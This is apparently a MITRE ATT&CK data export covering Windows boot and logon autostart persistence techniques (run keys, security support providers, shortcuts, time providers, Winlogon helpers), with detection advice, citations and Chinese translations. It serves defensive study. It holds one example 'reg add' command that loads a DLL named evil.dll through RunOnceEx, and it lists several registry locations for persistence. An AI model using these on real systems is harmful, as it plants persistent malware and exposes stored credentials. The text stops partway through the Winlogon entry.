T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following run keys are created by default on Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/001,23 January 2020,16 June 2022,1.2,"Persistence, Privilege Escalation","Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Creation, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Dray Agha, @Purp1eW0lf, Huntress Labs; Oddvar Moe, @oddvarmoe","Administrator, User",,,CAPEC-270,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: IBM Grandoreiro April 2020),(Citation: CopyKittens Nov 2015),(Citation: Kaspersky Sofacy),(Citation: TrendMicro Taidoor),(Citation: ESET Sednit Part 1),(Citation: ESET RTM Feb 2017),(Citation: Fortinet Remcos Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: TrendMicro PE_URSNIF.A2),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: Blasco 2013),(Citation: ESET Trickbot Oct 2020),(Citation: FinFisher Citation),(Citation: Arxiv Avaddon Feb 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Unit 42 Inception November 2018),(Citation: ESET Sednit Part 2),(Citation: ESET Zebrocy Nov 2018),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Proofpoint TA416 November 2020),(Citation: Talos Promethium June 2020),(Citation: ESET Operation Groundbait),(Citation: ESET Zebrocy May 2019),(Citation: Cylance Machete Mar 2017),(Citation: Group IB Ransomware September 2020),(Citation: Accenture Dragonfish Jan 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Dell Sakula),(Citation: Cybereason Bazar July 2020),(Citation: Palo Alto Comnie),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: FireEye APT33 Guardrail),(Citation: Novetta Blockbuster),(Citation: Zscaler Cobian Aug 2017),(Citation: Palo Alto DNS Requests),(Citation: FireEye APT10 April 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: Trend Micro DRBControl February 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Symantec Vasport May 2012),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit42 Xbash Sept 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Fortinet Agent Tesla April 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Forcepoint Monsoon),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Symantec Briba May 2012),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Symantec Emotet Jul 2018),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: Zscaler Higaisa 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CIRCL PlugX March 2013),(Citation: Github PowerShell Empire),(Citation: Secureworks Karagany July 2019),(Citation: Cisco DNSMessenger March 2017),(Citation: Symantec Dragonfly),(Citation: IBM IcedID November 2017),(Citation: FireEye FIN10 June 2017),(Citation: Fidelis INOCNATION),(Citation: CyberBit Early Bird Apr 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Novetta Blockbuster RATs),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Talos NavRAT May 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Profero APT27 December 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CERT-EE Gamaredon January 2021),(Citation: McAfee Gold Dragon),(Citation: GitHub QuasarRAT),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: McAfee Oceansalt Oct 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Bisonal Mar 2020),(Citation: Microsoft SIR Vol 19),(Citation: Kaspersky Darkhotel),(Citation: FireEye Periscope March 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: Bitdefender APT28 Dec 2015),(Citation: Trend Micro Qakbot December 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Cofense NanoCore Mar 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: FireEye CARBANAK June 2017),(Citation: Cymmetria Patchwork),(Citation: ESET Okrum July 2019),(Citation: Check Point Warzone Feb 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Cyble Sidewinder September 2020),(Citation: SecureList Griffon May 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: F-Secure CozyDuke),(Citation: BlackBerry Amadey 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: Prevx Carberp March 2011),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Talos Konni May 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: IBM TA505 April 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: Baumgartner Naikon 2015),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: Lookout Dark Caracal Jan 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: US-CERT Emotet Jul 2018),(Citation: ESET LoJax Sept 2018),(Citation: Cylance Dust Storm),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: McAfee Lazarus Jul 2020),(Citation: FireEye APT37 Feb 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Unit 42 Bisonal July 2018),(Citation: Emissary Trojan Feb 2016),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Morphisec ShellTea June 2019),(Citation: Talos MuddyWater May 2019),(Citation: ThreatStream Evasion Analysis),(Citation: fsecure NanHaiShu July 2016),(Citation: Crowdstrike Indrik November 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Securelist Kimsuky Sept 2013),(Citation: Malwarebytes Higaisa 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Talos Group123),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Lazarus APT January 2022),(Citation: PowerSploit Documentation),(Citation: Talos Rocke August 2018),(Citation: NCC Group Team9 June 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Group IB APT 41 June 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Talos Oblique RAT March 2021),(Citation: ESET InvisiMole June 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: FOX-IT May 2016 Mofang),(Citation: Kaspersky MoleRATs April 2019),(Citation: Microsoft Kasidet),(Citation: Group IB Silence Sept 2018),(Citation: Microsoft Holmium June 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: ZScaler Hacking Team),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: ESET EvilNum July 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye Hancitor),(Citation: ESET Dukes October 2019),(Citation: Securelist Machete Aug 2014),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye APT41 March 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Group IB RTM August 2019),(Citation: Unit 42 Nokki Oct 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Cylance Cleaver),(Citation: Picus Emotet Dec 2018),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: DustySky),(Citation: Lastline PlugX Analysis),(Citation: FireEye APT30),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: FireEye APT39 Jan 2019),(Citation: CrowdStrike Putter Panda),(Citation: Nccgroup Gh0st April 2018),(Citation: Talos MuddyWater Jan 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: FireEye FIN7 April 2017),(Citation: Microsoft FinFisher March 2018),(Citation: McAfee Netwire Mar 2015),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Symantec Backdoor.Mivast),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Casbaneiro Oct 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Sophos Maze VM September 2020),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: PaloAlto DNS Requests May 2016),(Citation: Secureworks MCMD July 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Palo Alto Rover),(Citation: ESET GreyEnergy Oct 2018),(Citation: Anomali Pirate Panda April 2020),(Citation: Trend Micro Conficker),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET Gazer Aug 2017),(Citation: ESET Turla Mosquito May 2018),(Citation: BlackBerry Bahamut),(Citation: FireEye Operation Double Tap),",引导或登录自动启动执行：注册表运行键/启动文件夹,"攻击者可以通过将程序添加到启动文件夹或使用注册表运行键引用它来实现持久性。在注册表或启动文件夹中的“运行键”中添加一个条目将导致引用的程序在用户登录时执行。（引用：Microsoft 运行键）这些程序将在用户的上下文中执行，并将具有帐户的关联权限级别。将程序放置在启动文件夹中也会导致该程序在用户登录时执行。有一个用于单个用户帐户的启动文件夹位置以及一个系统范围的启动文件夹，无论哪个用户帐户登录，都将检查该文件夹. 当前用户的启动文件夹路径为<code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>。所有用户的启动文件夹路径为<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>。 Windows 系统默认创建以下运行键： * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> 运行键可能存在于多个配置单元下。（引用：Microsoft Wow6432Node 2018）（引用：Malwarebytes Wow6432Node 2016）<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> 也可用，但默认情况下不会在 Windows Vista 和更高版本上创建。注册表运行键条目可以直接引用程序或将它们列为依赖项。（引用：Microsoft Run Key）例如，可以在登录时使用 RunOnceEx 的“Depend”键加载 DLL：<code>reg add HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code>（引用：Oddvar Moe RunOnceEx Mar 2018）可以使用以下注册表项为持久性设置启动文件夹项目： * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders< /code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell 文件夹</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell 文件夹</code> 以下注册表项可以控制启动过程中服务的自动启动： * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVe rsion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\RunServices</code> 使用策略设置指定启动程序会在以下两个注册表项中创建相应的值： * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run </code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> Winlogon 键控制用户登录到运行 Windows 7 的计算机时发生的操作。这些操作中的大多数受操作系统控制，但您也可以在此处添加自定义操作。 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 和 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 子键可以自动启动程序。任何用户登录时都会运行注册表项 <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> 的加载值中列出的程序。默认情况下，注册表项 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> 的多字符串 <code>BootExecute</code> 值设置为 <code>autocheck autochk *</code>。如果系统异常关闭，此值会导致 Windows 在启动时检查硬盘的文件系统完整性。攻击者可以将其他程序或进程添加到此注册表值，该注册表值将在启动时自动启动。攻击者可以使用这些配置位置来执行恶意软件，例如远程访问工具，以通过系统重启来保持持久性。攻击者还可以使用 [伪装](https://attack.mitre.org/techniques/T1036) 使注册表条目看起来好像与合法程序相关联。"
T1547.005,Boot or Logon Autostart Execution: Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",https://attack.mitre.org/techniques/T1547/005,24 January 2020,25 March 2020,1.0,"Persistence, Privilege Escalation",Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA),Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,,Administrator,,,,,,"(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Deply Mimikatz),(Citation: Github PowerShell Empire),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)",引导或登录自动启动执行：安全支持提供程序,攻击者可能会滥用安全支持提供程序 (SSP) 在系统启动时执行 DLL。 Windows SSP DLL 在系统启动时加载到本地安全机构 (LSA) 进程中。一旦加载到 LSA 中，SSP DLL 就可以访问存储在 Windows 中的加密和明文密码，例如任何登录用户的域密码或智能卡 PIN。 SSP 配置存储在两个注册表项中：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> 和 <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code >。攻击者可能会修改这些注册表项以添加新的 SSP，这些 SSP 将在下次系统启动或调用 AddSecurityPackage Windows API 函数时加载。（引用：Graeber 2014）
T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.",https://attack.mitre.org/techniques/T1547/009,24 January 2020,19 October 2022,1.2,"Persistence, Privilege Escalation","Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.

Monitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,"Bobby, Filar, Elastic; David French, Elastic; Travis Smith, Tripwire","Administrator, User",,,CAPEC-132,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye APT30),(Citation: IBM Grandoreiro April 2020),(Citation: Github PowerShell Empire),(Citation: FireEye APT39 Jan 2019),(Citation: NCC Group Team9 June 2020),(Citation: Cofense Astaroth Sept 2018),(Citation: ESET InvisiMole June 2020),(Citation: Unit 42 SeaDuke 2015),(Citation: Palo Alto OilRig May 2016),(Citation: FireEye Periscope March 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Talos Micropsia June 2017),(Citation: Cybereason Bazar July 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Palo Alto Comnie),(Citation: Accenture Hogfish April 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: F-Secure BlackEnergy 2014),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Securelist WhiteBear Aug 2017),(Citation: Palo Alto Reaver Nov 2017),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Konni May 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: Baumgartner Naikon 2015),(Citation: Cylance Cleaver),(Citation: ESET Gazer Aug 2017),(Citation: Cylance Dust Storm),(Citation: UCF STIG Symbolic Links)",引导或登录自动启动执行：快捷方式修改,攻击者可能会创建或修改可以在系统引导或用户登录期间执行程序的快捷方式。快捷方式或符号链接用于引用系统启动进程单击或执行快捷方式时将打开或执行的其他文件或程序。攻击者可能会滥用启动文件夹中的快捷方式来执行他们的工具并实现持久性。（引用：持久性的快捷方式）虽然经常用作感染链中的有效负载（例如[Spearphishing Attachment]（https://attack.mitre.org/techniques） /T1566/001))，攻击者也可能创建一个新的快捷方式作为间接手段，同时还滥用 [Masquerading](https://attack.mitre.org/techniques/T1036) 使恶意快捷方式显示为合法的程序。攻击者还可以编辑目标路径或完全替换现有的快捷方式，以便执行他们的恶意软件而不是预期的合法程序。快捷方式也可以被滥用来通过实现其他方法来建立持久性。例如，可以修改 LNK 浏览器扩展（例如 [浏览器扩展](https://attack.mitre.org/techniques/T1176)）以持续启动恶意软件。
T1547.003,Boot or Logon Autostart Execution: Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)

Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",https://attack.mitre.org/techniques/T1547/003,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)

The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Scott Lundgren, @5twenty9, Carbon Black","Administrator, SYSTEM",,,,,,",(Citation: Microsoft W32Time May 2017)",引导或登录自动启动执行：时间提供程序,攻击者可能会滥用时间提供程序在系统启动时执行 DLL。 Windows 时间服务 (W32Time) 支持跨域和域内的时间同步。（引用：Microsoft W32Time Feb 2018）W32Time 时间提供程序负责从硬件/网络资源中检索时间戳并将这些值输出到其他网络客户端。（引用：Microsoft TimeProvider）时间提供程序作为动态链接库 (DLL) 实现，这些库在 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code> 的子项中注册。（引用：Microsoft TimeProvider）时间提供程序管理器，由服务控制管理器指导，在系统启动时和/或参数更改时加载和启动在此键下列出和启用的时间提供程序。（引用：Microsoft TimeProvider）攻击者可能滥用此架构来建立持久性，特别是通过注册和启用恶意 DLL 作为时间提供程序。时间提供者注册需要管理员权限，但执行将在本地服务帐户的上下文中运行。（引用：Github W32Time Oct 2017）
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

